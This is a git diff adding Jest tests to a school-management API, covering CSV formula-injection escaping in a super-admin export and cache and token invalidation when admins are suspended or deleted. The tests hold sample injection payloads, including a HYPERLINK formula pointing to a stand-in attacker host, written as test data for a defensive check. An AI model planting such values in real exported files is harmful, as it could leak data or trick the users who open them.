@@ -10,7 +10,7 @@ import express from 'express';
 import jwt from 'jsonwebtoken';
 
 import pool from '../src/db/client';
-import superAdminRouter from '../src/routes/superAdmin';
+import superAdminRouter, { csvCell } from '../src/routes/superAdmin';
 import teacherDashboardRouter from '../src/routes/teacherDashboard';
 import { detectSupportSession } from '../src/middleware/detectSupportSession';
 import { errorHandler } from '../src/middleware/errorHandler';
@@ -909,6 +909,284 @@ describe('superAdmin — platform school management', () => {
       const found = res.body.data.find((s: { id: string }) => s.id === sessionId);
       expect(found).toBeDefined();
       expect(found.status).toBe('ended');
+    });
+  });
+
+  // ── csvCell — formula/CSV injection prevention ───────────────────────────────
+
+  describe('csvCell — formula/CSV injection prevention', () => {
+    it.each(['=HYPERLINK("https://attacker.tld","x")', '+1+1', '-1+1', '@SUM(1,1)', '\tmalicious', '\rmalicious'])(
+      'prefixes a leading apostrophe when the cell starts with a formula-trigger character (%s)',
+      (input) => {
+        const result = csvCell(input);
+        // \r also matches the pre-existing quote-wrapping regex, so unwrap before
+        // asserting — the leading apostrophe must survive either way.
+        const unquoted = result.startsWith('"') && result.endsWith('"') ? result.slice(1, -1).replace(/""/g, '"') : result;
+        expect(unquoted.startsWith("'")).toBe(true);
+        expect(unquoted).toBe(`'${input}`);
+      }
+    );
+
+    it('does not alter a normal string with no formula-trigger prefix', () => {
+      expect(csvCell('Jane Doe')).toBe('Jane Doe');
+    });
+
+    it('still quotes/escapes a formula-triggering value that also contains a comma and a quote', () => {
+      const input = '=HYPERLINK("evil","click"),extra';
+      const result = csvCell(input);
+      expect(result.startsWith('"')).toBe(true);
+      expect(result.endsWith('"')).toBe(true);
+      expect(result).toBe(`"'${input.replace(/"/g, '""')}"`);
+    });
+
+    it('leaves null/undefined as an empty string', () => {
+      expect(csvCell(null)).toBe('');
+      expect(csvCell(undefined)).toBe('');
+    });
+  });
+
+  describe('GET /schools/:schoolId/export — formula injection is neutralized end-to-end', () => {
+    let csvSchoolId: string;
+    let csvUserId: string;
+    let csvStudentId: string;
+    const maliciousName = '=HYPERLINK("https://attacker.tld/?d=1","Click me")';
+
+    beforeAll(async () => {
+      const schoolResult = await pool.query<{ id: string }>(
+        `INSERT INTO schools (name, slug, is_active) VALUES ($1, $2, true) RETURNING id`,
+        ['CSV Injection Test School', `test-csv-injection-${randomUUID()}`]
+      );
+      csvSchoolId = schoolResult.rows[0].id;
+
+      const userResult = await pool.query<{ id: string }>(
+        `INSERT INTO users (school_id, email, password_hash, role, first_name, last_name, is_active, teacher_mode)
+         VALUES ($1, $2, 'test-hash', 'student', $3, 'Injection', true, 'subject')
+         RETURNING id`,
+        [csvSchoolId, `csv-injection-${randomUUID()}@test.com`, maliciousName]
+      );
+      csvUserId = userResult.rows[0].id;
+
+      const studentResult = await pool.query<{ id: string }>(
+        `INSERT INTO students (school_id, user_id, admission_no, gender, dob)
+         VALUES ($1, $2, $3, 'F', '2010-01-01')
+         RETURNING id`,
+        [csvSchoolId, csvUserId, `CSV-INJ-${randomUUID()}`]
+      );
+      csvStudentId = studentResult.rows[0].id;
+    }, 20000);
+
+    afterAll(async () => {
+      await pool.query(`DELETE FROM students WHERE id = $1`, [csvStudentId]);
+      await pool.query(`DELETE FROM users WHERE id = $1`, [csvUserId]);
+      await pool.query(`DELETE FROM schools WHERE id = $1`, [csvSchoolId]);
+    });
+
+    it('a student full_name starting with "=" is neutralized with a leading apostrophe in the CSV output', async () => {
+      const res = await request(app)
+        .get(`/api/super-admin/schools/${csvSchoolId}/export`)
+        .set('Authorization', `Bearer ${superAdminToken}`);
+      expect(res.status).toBe(200);
+      const lines = res.text.split('\n');
+      const dataLine = lines.find((line) => line.includes('Injection'));
+      expect(dataLine).toBeDefined();
+      // Raw "=HYPERLINK(...)" must never appear un-neutralized — it must be preceded
+      // by a leading apostrophe (either bare or inside the quoted cell).
+      expect(dataLine).not.toMatch(/,=HYPERLINK/);
+      expect(dataLine).toMatch(/'=HYPERLINK/);
+    });
+  });
+
+  // ── Platform Admin Suspension & Deletion — cache + support-session invalidation ──
+
+  describe('Platform Admin Suspension & Deletion — cache + support-session invalidation', () => {
+    const TEACHER_ID = '37a19d2d-fa5d-45d3-9dc1-5ea1875ef3e0';
+
+    let redisStore: Map<string, string>;
+    let mockRedisGet: jest.Mock;
+    let mockRedisSet: jest.Mock;
+    let mockRedisDel: jest.Mock;
+    let isolatedApp: express.Express;
+    let isolatedPool: { end: () => Promise<void> };
+    let rootAdminToken: string;
+    const createdAdminIds: string[] = [];
+
+    async function createTargetAdmin(label: string): Promise<{ id: string; email: string }> {
+      const email = `${label}-${randomUUID()}@test.com`;
+      const result = await pool.query<{ id: string }>(
+        `INSERT INTO users (school_id, email, password_hash, role, first_name, last_name, is_active, teacher_mode)
+         VALUES (NULL, $1, 'test-hash', 'super_admin', 'Target', 'Admin', true, 'subject')
+         RETURNING id`,
+        [email]
+      );
+      createdAdminIds.push(result.rows[0].id);
+      return { id: result.rows[0].id, email };
+    }
+
+    // Fixed, test-owned value so rootGuard is deterministic regardless of what
+    // (if anything) the real .env's ROOT_ADMIN_EMAIL resolves to in this DB —
+    // matches the pattern in tests/payoutSettings.test.ts.
+    const ROOT_ADMIN_EMAIL = `root-admin-test-${randomUUID()}@chronixedu-test.com`;
+
+    beforeAll(async () => {
+      process.env.ROOT_ADMIN_EMAIL = ROOT_ADMIN_EMAIL;
+      const rootRow = await pool.query<{ id: string; email: string }>(
+        `INSERT INTO users (school_id, email, password_hash, role, first_name, last_name, is_active, teacher_mode)
+         VALUES (NULL, $1, 'test-hash', 'super_admin', 'Root', 'Admin', true, 'subject')
+         RETURNING id, email`,
+        [ROOT_ADMIN_EMAIL]
+      );
+      createdAdminIds.push(rootRow.rows[0].id);
+      rootAdminToken = makeToken(rootRow.rows[0].id, 'super_admin', null, rootRow.rows[0].email);
+
+      // Build a second app instance whose superAdmin router was loaded with a mocked,
+      // in-memory Redis client — so we can assert on cache-busting/blacklisting calls
+      // without disturbing the top-level `app` (which other tests in this file rely on
+      // running against the real, unmocked `redis` — null in this test environment).
+      redisStore = new Map();
+      mockRedisGet = jest.fn(async (key: string) => (redisStore.has(key) ? (redisStore.get(key) as string) : null));
+      mockRedisSet = jest.fn(async (key: string, value: string) => {
+        redisStore.set(key, value);
+        return 'OK';
+      });
+      mockRedisDel = jest.fn(async (key: string) => (redisStore.delete(key) ? 1 : 0));
+
+      let isolatedSuperAdminRouter: express.Router;
+      jest.isolateModules(() => {
+        jest.doMock('../src/middleware/rateLimit', () => {
+          const actual = jest.requireActual('../src/middleware/rateLimit');
+          return {
+            ...actual,
+            redis: { get: mockRedisGet, set: mockRedisSet, del: mockRedisDel },
+          };
+        });
+        // eslint-disable-next-line @typescript-eslint/no-var-requires
+        isolatedSuperAdminRouter = require('../src/routes/superAdmin').default;
+        // isolateModules gives superAdmin.ts (and everything it transitively requires,
+        // including db/client.ts) a fresh module registry — so it gets its own `pg`
+        // Pool, separate from the `pool` this file imported at the top. Grab it so it
+        // can be closed below; otherwise it's a dangling open handle after the suite.
+        // eslint-disable-next-line @typescript-eslint/no-var-requires
+        isolatedPool = require('../src/db/client').default;
+      });
+
+      isolatedApp = express();
+      isolatedApp.use(express.json());
+      isolatedApp.use('/api/super-admin', isolatedSuperAdminRouter!);
+      isolatedApp.use(errorHandler);
+    }, 20000);
+
+    afterAll(async () => {
+      if (createdAdminIds.length > 0) {
+        // Root admin acted as platform_admin_id on every suspend/delete audit row
+        // this suite generated; target admins appear as target_user_id — clean up
+        // both directions before deleting the users themselves (FK constraint).
+        await pool.query(`DELETE FROM platform_audit_logs WHERE target_user_id = ANY($1) OR platform_admin_id = ANY($1)`, [createdAdminIds]);
+        await pool.query(`DELETE FROM support_sessions WHERE platform_admin_id = ANY($1)`, [createdAdminIds]);
+        await pool.query(`DELETE FROM users WHERE id = ANY($1)`, [createdAdminIds]);
+      }
+      await isolatedPool.end();
+    });
+
+    beforeEach(() => {
+      mockRedisGet.mockClear();
+      mockRedisSet.mockClear();
+      mockRedisDel.mockClear();
+    });
+
+    it('PATCH /admins/:id/suspend — busts the user_active cache so the suspended admin is rejected immediately', async () => {
+      const target = await createTargetAdmin('suspend-cache');
+      const targetToken = makeToken(target.id, 'super_admin', null, target.email);
+
+      // Simulate the worst case for the old 300s-TTL bug: the cache says "active"
+      // right up until the moment of suspension.
+      redisStore.set(`user_active:${target.id}`, '1');
+
+      const suspendRes = await request(isolatedApp)
+        .patch(`/api/super-admin/admins/${target.id}/suspend`)
+        .set('Authorization', `Bearer ${rootAdminToken}`)
+        .send({ reason: 'Investigating suspicious platform activity' });
+      expect(suspendRes.status).toBe(200);
+      expect(suspendRes.body.data.is_active).toBe(false);
+      expect(mockRedisSet).toHaveBeenCalledWith(`user_active:${target.id}`, '0', 'EX', 300);
+
+      const afterRes = await request(isolatedApp)
+        .get('/api/super-admin/schools')
+        .set('Authorization', `Bearer ${targetToken}`);
+      expect(afterRes.status).toBe(403);
+      expect(afterRes.body.error.code).toBe('ACCOUNT_SUSPENDED');
+    });
+
+    it('PATCH /admins/:id/suspend — ends the admin\'s active support session and blacklists its scoped token', async () => {
+      const target = await createTargetAdmin('suspend-sessions');
+      const targetToken = makeToken(target.id, 'super_admin', null, target.email);
+
+      const startRes = await request(isolatedApp)
+        .post('/api/super-admin/support-sessions')
+        .set('Authorization', `Bearer ${targetToken}`)
+        .send({ school_id: SCHOOL_ID, user_id: TEACHER_ID, reason: 'Investigating a support ticket, pre-suspend' });
+      expect(startRes.status).toBe(200);
+      const sessionId = startRes.body.data.session_id;
+      const scopedToken = startRes.body.data.scoped_token;
+
+      const suspendRes = await request(isolatedApp)
+        .patch(`/api/super-admin/admins/${target.id}/suspend`)
+        .set('Authorization', `Bearer ${rootAdminToken}`)
+        .send({ reason: 'Investigating suspicious platform activity' });
+      expect(suspendRes.status).toBe(200);
+
+      const sessionRow = await pool.query<{ ended_at: string | null }>(
+        `SELECT ended_at FROM support_sessions WHERE id = $1`,
+        [sessionId]
+      );
+      expect(sessionRow.rows[0].ended_at).not.toBeNull();
+      expect(mockRedisSet).toHaveBeenCalledWith(`blacklisted_token:${scopedToken}`, '1', 'EX', expect.any(Number));
+    });
+
+    it('DELETE /admins/:id — busts the user_active cache so the deleted admin is rejected immediately', async () => {
+      const target = await createTargetAdmin('delete-cache');
+      const targetToken = makeToken(target.id, 'super_admin', null, target.email);
+
+      redisStore.set(`user_active:${target.id}`, '1');
+
+      const deleteRes = await request(isolatedApp)
+        .delete(`/api/super-admin/admins/${target.id}`)
+        .set('Authorization', `Bearer ${rootAdminToken}`)
+        .send({ confirmation_email: target.email });
+      expect(deleteRes.status).toBe(200);
+      expect(deleteRes.body.data.deleted).toBe(true);
+      expect(mockRedisSet).toHaveBeenCalledWith(`user_active:${target.id}`, '0', 'EX', 300);
+
+      const afterRes = await request(isolatedApp)
+        .get('/api/super-admin/schools')
+        .set('Authorization', `Bearer ${targetToken}`);
+      expect(afterRes.status).toBe(403);
+      expect(afterRes.body.error.code).toBe('ACCOUNT_SUSPENDED');
+    });
+
+    it('DELETE /admins/:id — ends the admin\'s active support session and blacklists its scoped token', async () => {
+      const target = await createTargetAdmin('delete-sessions');
+      const targetToken = makeToken(target.id, 'super_admin', null, target.email);
+
+      const startRes = await request(isolatedApp)
+        .post('/api/super-admin/support-sessions')
+        .set('Authorization', `Bearer ${targetToken}`)
+        .send({ school_id: SCHOOL_ID, user_id: TEACHER_ID, reason: 'Investigating a support ticket, pre-delete' });
+      expect(startRes.status).toBe(200);
+      const sessionId = startRes.body.data.session_id;
+      const scopedToken = startRes.body.data.scoped_token;
+
+      const deleteRes = await request(isolatedApp)
+        .delete(`/api/super-admin/admins/${target.id}`)
+        .set('Authorization', `Bearer ${rootAdminToken}`)
+        .send({ confirmation_email: target.email });
+      expect(deleteRes.status).toBe(200);
+
+      const sessionRow = await pool.query<{ ended_at: string | null }>(
+        `SELECT ended_at FROM support_sessions WHERE id = $1`,
+        [sessionId]
+      );
+      expect(sessionRow.rows[0].ended_at).not.toBeNull();
+      expect(mockRedisSet).toHaveBeenCalledWith(`blacklisted_token:${scopedToken}`, '1', 'EX', expect.any(Number));
     });
   });
 });
